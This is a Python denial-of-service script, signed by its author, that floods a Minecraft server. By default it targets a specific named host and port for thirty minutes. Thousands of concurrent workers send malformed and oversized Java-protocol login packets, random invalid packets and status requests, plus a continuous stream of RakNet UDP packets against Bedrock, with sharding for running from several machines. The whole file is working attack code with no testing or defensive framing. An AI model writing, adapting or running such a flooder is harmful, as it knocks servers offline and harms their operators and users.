# combo_load.py — banner + combo flood
# python 3.12 | stdlib only

import asyncio
import os
import random
import signal
import socket
import struct
import string
import time

BANNER = r"""
    ██╗  ██╗ █████╗ ██╗      ██████╗
    ██║  ██║██╔══██╗██║     ██╔═══██╗
    ███████║███████║██║     ██║   ██║
    ██╔══██║██╔══██║██║     ██║   ██║
    ██║  ██║██║  ██║███████╗╚██████╔╝
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝

    ╔═══════════════════════════════════╗
    ║           By: Mex                 ║
    ║           absolute olliE          ║
    ╚═══════════════════════════════════╝
"""


HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
PORT     = int(os.environ.get("PORT", "5080"))
DURATION = int(os.environ.get("DURATION", "1800"))
CONC_J   = int(os.environ.get("CONC_J", "1000"))
CONC_B   = int(os.environ.get("CONC_B", "1000"))
SHARD    = os.environ.get("SHARD", "0")

CONNECT_TIMEOUT = 5.0

PROTO_VERSIONS = [
    47, 107, 108, 109, 110, 210, 315, 335, 338, 340,
    393, 401, 404, 477, 480, 485, 490, 498, 573, 578,
    735, 736, 751, 753, 754, 755, 756, 757, 758, 759,
    760, 761, 762, 763, 764, 765, 766,
]

RAKNET_MAGIC = bytes([
    0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
    0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
])

UNICODE_CHARS = (
    "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᚾᛁᛃᛇᛈᛉᛊᛏᛒᛖᛗᛚᛜᛞᛟ"
    "अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभम"
    "アカサタナハマヤラワガザダバパイキシチニヒミリヰギジヂビピ"
    "😀😁😂🤣😃😄😅😆😉😊😋😎😍😘🥰😗"
    "ﬢﬣﬤﬥﬦﬧﬨ﬩שׁשׂשּׁ"
)


def vi_write(v: int) -> bytes:
    out = b""
    while True:
        b = v & 0x7F
        v >>= 7
        out += bytes([b | 0x80]) if v else bytes([b])
        if not v:
            return out


def pack_string(s: str) -> bytes:
    r = s.encode("utf-8")
    return vi_write(len(r)) + r


def pack_packet(pid: int, payload: bytes = b"") -> bytes:
    body = vi_write(pid) + payload
    return vi_write(len(body)) + body


def random_unicode_name(max_len: int = 16) -> str:
    n = random.randint(3, max_len)
    return "".join(random.choice(UNICODE_CHARS) for _ in range(n))


def random_ascii_name(max_len: int = 16) -> str:
    n = random.randint(3, max_len)
    return "".join(random.choices(
        string.ascii_letters + string.digits + "._-",
        k=n))


def build_handshake(proto_ver: int, state: int) -> bytes:
    p = (vi_write(proto_ver) + pack_string(HOST)
         + struct.pack(">H", PORT) + vi_write(state))
    return pack_packet(0x00, p)


def build_login_start(name: str, malformed: bool = False) -> bytes:
    if malformed:
        body = pack_string(name) + vi_write(random.getrandbits(32))
        return pack_packet(0x00, body)
    return pack_packet(0x00, pack_string(name))


def build_status_request() -> bytes:
    return pack_packet(0x00)


def build_invalid_packet(proto_ver: int) -> bytes:
    pid = random.randint(0x30, 0x7F)
    body = random.randbytes(random.randint(0, 200))
    return pack_packet(pid, body)


def build_oversized_packet() -> bytes:
    body = random.randbytes(random.randint(2000, 5000))
    return pack_packet(0x00, body)


class Stats:
    def __init__(self):
        self.j_ok = 0
        self.j_fail = 0
        self.b_sent = 0
        self.b_rx = 0
        self.b_rx_bytes = 0
        self.b_fail = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def inc_j(self, ok=0, fail=0):
        async with self.lock:
            self.j_ok += ok
            self.j_fail += fail

    async def inc_b(self, sent=0, rx=0, b=0, fail=0):
        async with self.lock:
            self.b_sent += sent
            self.b_rx += rx
            self.b_rx_bytes += b
            self.b_fail += fail

    def snap(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        return (f"[shard {SHARD}] J ok={self.j_ok} fail={self.j_fail} "
                f"rate={self.j_ok / dt:.0f} | "
                f"B sent={self.b_sent} rx={self.b_rx} "
                f"rxb={self.b_rx_bytes} fail={self.b_fail} "
                f"rate={self.b_sent / dt:.0f}")


STATS = Stats()
STOP = asyncio.Event()


async def java_malformed_once():
    try:
        proto = random.choice(PROTO_VERSIONS)
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(build_handshake(proto, 2))
        await w.drain()
        if random.random() < 0.5:
            name = random_unicode_name()
        else:
            name = random_ascii_name()
        malformed = random.random() < 0.4
        w.write(build_login_start(name, malformed=malformed))
        await w.drain()
        if random.random() < 0.3:
            w.write(build_invalid_packet(proto))
            await w.drain()
        await asyncio.sleep(random.uniform(0.1, 0.5))
        w.close()
        await STATS.inc_j(ok=1)
    except (asyncio.TimeoutError, OSError):
        await STATS.inc_j(fail=1)


async def java_oversized_once():
    try:
        proto = random.choice(PROTO_VERSIONS)
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(build_handshake(proto, 1))
        await w.drain()
        w.write(build_oversized_packet())
        await w.drain()
        w.close()
        await STATS.inc_j(ok=1)
    except (asyncio.TimeoutError, OSError):
        await STATS.inc_j(fail=1)


async def java_status_once():
    try:
        proto = random.choice(PROTO_VERSIONS)
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(build_handshake(proto, 1))
        w.write(build_status_request())
        await w.drain()
        w.close()
        await STATS.inc_j(ok=1)
    except (asyncio.TimeoutError, OSError):
        await STATS.inc_j(fail=1)


async def java_worker():
    while not STOP.is_set():
        r = random.random()
        if r < 0.55:
            await java_malformed_once()
        elif r < 0.80:
            await java_status_once()
        else:
            await java_oversized_once()


class BedrockWorker:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
        self.sock.setblocking(False)
        self.pkts = [
            b"\x01" + struct.pack(">Q", random.getrandbits(64))
            + RAKNET_MAGIC + struct.pack(">Q", random.getrandbits(64)),
            b"\x05" + RAKNET_MAGIC + bytes([11]) + b"\x00" * 1400,
            b"\x07" + RAKNET_MAGIC + random.randbytes(4) + b"\x00",
            b"\x19" + bytes([11]) + RAKNET_MAGIC + random.randbytes(8),
        ]

    async def run(self):
        while not STOP.is_set():
            try:
                pkt = random.choice(self.pkts)
                self.sock.sendto(pkt, (HOST, PORT))
                await STATS.inc_b(sent=1)
                for _ in range(4):
                    try:
                        data, _ = self.sock.recvfrom(4096)
                        await STATS.inc_b(rx=1, b=len(data))
                    except BlockingIOError:
                        break
                    except OSError:
                        break
                await asyncio.sleep(0)
            except OSError:
                await STATS.inc_b(fail=1)


async def reporter():
    while not STOP.is_set():
        await asyncio.sleep(3)
        print(STATS.snap(), flush=True)


def print_banner():
    print(BANNER)
    print(f"  target   : {HOST}:{PORT}")
    print(f"  java     : {CONC_J} workers")
    print(f"  bedrock  : {CONC_B} workers")
    print(f"  duration : {DURATION}s")
    print(f"  shard    : {SHARD}")
    print("=" * 60)
    print()


async def main():
    print_banner()

    java_tasks = [asyncio.create_task(java_worker()) for _ in range(CONC_J)]
    bedrock_workers = [BedrockWorker() for _ in range(CONC_B)]
    bedrock_tasks = [asyncio.create_task(w.run()) for w in bedrock_workers]
    rep = asyncio.create_task(reporter())

    try:
        await asyncio.sleep(DURATION)
    finally:
        STOP.set()
        rep.cancel()
        for t in java_tasks + bedrock_tasks:
            t.cancel()
        await asyncio.gather(*(java_tasks + bedrock_tasks),
                             return_exceptions=True)

    print(STATS.snap(), flush=True)


def _sig(s, f):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
